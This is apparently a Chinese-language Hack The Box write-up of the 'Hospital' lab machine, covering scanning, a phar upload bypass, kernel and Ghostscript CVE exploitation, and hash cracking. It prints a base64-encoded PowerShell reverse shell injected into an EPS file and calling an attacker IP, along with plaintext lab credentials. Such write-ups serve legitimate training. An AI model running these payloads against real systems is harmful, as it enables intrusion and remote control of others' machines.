---
layout: post
title: HTB——Hospital
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/HTB-Hospital/01.png?raw=true)

# 0x01 信息收集

---

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[04:59:20] [INFO] Start IpScan:10.129.36.151
[04:59:20] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[04:59:21] [+] 10.129.36.151:22 open
[04:59:21] [+] 10.129.36.151:636 open
[04:59:21] [+] 10.129.36.151:88 open
[04:59:21] [+] 10.129.36.151:135 open
[04:59:21] [+] 10.129.36.151:445 open
[04:59:21] [+] 10.129.36.151:139 open
[04:59:21] [+] 10.129.36.151:389 open
[04:59:21] [+] 10.129.36.151:464 open
[04:59:21] [+] 10.129.36.151:443 open
[04:59:21] [+] 10.129.36.151:593 open
[04:59:21] [+] 10.129.36.151:53 open
[04:59:23] [+] [TCP/SSH]  [OpenSSH 9.0p1 Ubuntu 1ubuntu8.5] 10.129.36.151:22 [SSH-2.0-OpenSSH_9.0p1 Ubuntu-1ubuntu8.5]
[04:59:23] [INFO] start SSH check 10.129.36.151:22
[04:59:23] [+] 开始 SshScan 任务: SSH://10.129.36.151:22
[04:59:24] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.36.151:135 [.@]
[04:59:24] [INFO] start WMI check 10.129.36.151:135
[04:59:24] [+] 开始 WmiExec 任务: WMI://10.129.36.151:135
[04:59:26] [+] [TLS/HTTPS] [200] [Apache-HTTP-Server/2.4.56][Apache-Struts2][JEECG-VUE3版][Apache-Web-Server][Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28][jQuery] https://10.129.36.151:443 [Hospital Webmail :: Welcome to Hospital Webmail]                                                                                        
[04:59:26] [+] 10.129.36.151:1801 open
[04:59:26] [+] 10.129.36.151:2103 open
[04:59:27] [+] 10.129.36.151:2105 open
[04:59:27] [+] 10.129.36.151:2107 open
[04:59:27] [+] 10.129.36.151:2179 open
[04:59:30] [+] [TCP/SPARK]  [Apache Spark] 10.129.36.151:88 [.]
[04:59:32] [+] 10.129.36.151:3269 open
[04:59:32] [+] 10.129.36.151:3268 open
[04:59:32] [+] 10.129.36.151:3389 open
[04:59:34] [+] [TCP/RDP]  [Microsoft Terminal Services] 10.129.36.151:3389 [.4]
[04:59:34] [INFO] start RDP check 10.129.36.151:3389
[04:59:34] [+] 开始 RdpScan 任务: RDP://10.129.36.151:3389
[04:59:35] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.36.151:636 [0.d.{.0.s0.domainFunctionality1.70.forestFunctiona]                                                                                 
[04:59:35] [INFO] start LDAP check 10.129.36.151:636
[04:59:35] [+] 开始 LdapScan 任务: LDAP://10.129.36.151:636
[04:59:38] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.36.151:3268 [0.d.{.0.s0.domainFunctionality1.70.forestFunctiona]                                                                                
[04:59:38] [INFO] start LDAP check 10.129.36.151:3268
[04:59:38] [+] 开始 LdapScan 任务: LDAP://10.129.36.151:3268
[04:59:38] [+] [TCP/MSMQ]   10.129.36.151:1801 
[04:59:39] [+] [TCP/VMRDP]   10.129.36.151:2179 
[04:59:40] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.36.151:3269 [0.d.{.0.s0.domainFunctionality1.70.forestFunctiona]                                                                                
[04:59:40] [INFO] start LDAP check 10.129.36.151:3269
[04:59:40] [+] 开始 LdapScan 任务: LDAP://10.129.36.151:3269
[04:59:42] [+] 10.129.36.151:6404 open
[04:59:42] [+] 10.129.36.151:6407 open
[04:59:42] [+] 10.129.36.151:6409 open
[04:59:42] [+] 10.129.36.151:5985 open
[04:59:42] [+] 10.129.36.151:6406 open
[04:59:42] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.36.151:6406 [ncacn_http/1.0]
[04:59:44] [+] 10.129.36.151:6615 open
[04:59:44] [+] 10.129.36.151:6629 open
[04:59:48] [+] [TCP/MSMQ-MGMT]   10.129.36.151:2107 
[04:59:48] [+] [TCP/ZEPHYR-CLT]   10.129.36.151:2103 
[04:59:48] [+] [TCP/EKLOGIN]   10.129.36.151:2105 
[04:59:51] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.36.151:5985 [Not Found]
[04:59:51] [INFO] start WinRM check 10.129.36.151:5985
[04:59:51] [+] 开始 WinRMScan 任务: WinRM://10.129.36.151:5985
[04:59:52] [+] 10.129.36.151:8080 open
[04:59:53] [+] [TCP/HTTP] [200] [Apache-Web-Server][Apache/2.4.55 (Ubuntu)][Apache-HTTP-Server/2.4.55][jQuery] http://10.129.36.151:8080 [Login]
[04:59:53] [INFO] start Tomcat check 10.129.36.151:8080
[04:59:53] [+] 开始 TomcatScan 任务: Tomcat://10.129.36.151:8080
[04:59:55] [+] 10.129.36.151:9389 open
[05:00:02] [+] [TCP/ADWS]   10.129.36.151:9389 
[05:00:03] [+] [TCP/BOE-RESSSVR1]   10.129.36.151:6407 
[05:00:03] [+] [TCP/BOE-FILESVR]   10.129.36.151:6404 
[05:00:03] [+] [TCP/BOE-RESSSVR3]   10.129.36.151:6409 
[05:00:07] [+] [TCP/NEXGEN-AUX]   10.129.36.151:6629 
[05:00:07] [+] [TCP/UNKNOWN]   10.129.36.151:6615 
[05:00:27] [+] 10.129.36.151:17631 open
                                                          ]   
[05:03:36] [+] alive ports is: 29
[05:03:36] [+] Ip扫描结束:10.129.36.151
[05:03:36] [INFO] Start UrlScan:https://10.129.36.151:443
http://10.129.36.151:598...
[05:03:36] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.36.151:5985 [Not Found]
[05:03:37] [+] [TCP/HTTP] [200] [Apache/2.4.55 (Ubuntu)][Apache-HTTP-Server/2.4.55][Apache-Web-Server][jQuery] http://10.129.36.151:8080 [Login]
[05:03:37] [+] [TLS/HTTPS] [200] [Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28][Apache-Web-Server][Apache-HTTP-Server/2.4.56][Apache-Struts2][JEECG-VUE3版][jQuery-ui] https://10.129.36.151:443 [Hospital Webmail :: Welcome to Hospital Webmail]                                                                                     
                                                 
[05:03:37] [+] Url扫描结束:https://10.129.36.151:443
http://10.129.36.151:598...
[05:03:37] [+] 项目任务完成:Default, Timeuse：247.990841093
[05:03:37] [+] 扫描结束,耗时: 4m8.322997938s
```

---

# 0x02 文件上传黑名单phar+CVE-2023-35001

---

访问443端口的`webmail`服务，发现搭建的是`roundcube`服务。我们再转去8080端口的服务尝试fuzz文件上传。上传点经过fuzz发现没有ban掉phar文件。那我们就可以拿到第一个shell了。这里笔者尝试很多次，直接运行含有反弹shell指令的phar文件都没有办法正常拿到shell，找了半天找到一个能用的项目

- [flozz/p0wny-shell: Single-file PHP shell](https://github.com/flozz/p0wny-shell)

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/HTB-Hospital/02.png?raw=true)

我们查看此服务器版本，是`5.19.0-35-generic`的`kernel`。已知此版本有提权漏洞，我们先尝试提权，再去查看`shadow`文件与`passwd`文件。

- [synacktiv/CVE-2023-35001: Pwn2Own Vancouver 2023 Ubuntu LPE exploit](https://github.com/Synacktiv/CVE-2023-35001)

提权完成后我们查看shadow文件，发现除了root还有个`drwilliams`的密码。使用hashcat爆破出密码后我们尝试SSH一下

```bash
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
Time.Started.....: Fri Apr 04 18:48:49 2025 (1 sec)
Time.Estimated...: Fri Apr 04 18:48:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   193.6 kH/s (7.88ms) @ Accel:512 Loops:128 Thr:128 Vec:1
Speed.#2.........:     2246 H/s (10.76ms) @ Accel:16 Loops:8 Thr:1024 Vec:1
Speed.#*.........:   195.8 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 262144/14344385 (1.83%)
Rejected.........: 0/262144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:928-936
Candidate.Engine.: Device Generator
Candidates.#1....: sexyss -> bee1234
Candidates.#2....: ryanscott -> janson
Hardware.Mon.#1..: Temp: 53c Util: 88% Core: 232MHz Mem:14001MHz Bus:8
Hardware.Mon.#2..: N/A

Started: Fri Apr 04 18:48:05 2025
Stopped: Fri Apr 04 18:48:51 2025
```

---

# 0x03 CVE-2023-36664

---

使用SSH登陆后，我们根据提示查看`drwilliams`的邮件信息。linux端没有邮件信息，联想到我们一开始拿到的`443`端口，使用此账密登陆后查看邮件信息。提醒我们注意`GhostScript`的2023年CVE，找到一个`eps`解析RCE漏洞，但没想到怎么用。看了WP才知道是给`drbrown`就可以直接触发了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Hospital/CVE-2023-36664-Ghostscript-command-injection-main]
└─# python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.16.6 -port 54313 --filename caixukun --extension eps
[+] Generated EPS payload file: caixukun.eps
                                                                                                              
┌──(root㉿kali)-[/home/kali/HTB/Hospital/CVE-2023-36664-Ghostscript-command-injection-main]
└─# python3 CVE_2023_36664_exploit.py --inject --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANQA0ADMAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --filename caixukun.eps 
[+] Payload successfully injected into caixukun.eps
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/HTB-Hospital/03.png?raw=true)

---

# 0x04 bat脚本自动化登录密码获取

注意到我们上线时的文件夹内有一个`.bat`脚本，里面有`drbrown`的密码

```powershell
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

我们还发现此主机上在定时自动运行输入`Administrator`账密登录Webmail的行为。可以IE浏览器选择保存登陆密码后直接到凭据管理器内查看保存的密码是啥。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/HTB-Hospital/04.png?raw=true)

手敲出密码为`Th3B3stH0sp1t4l9786!`,接下来RDP登录即可拿到`root.txt`了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/HTB-Hospital/05.png?raw=true)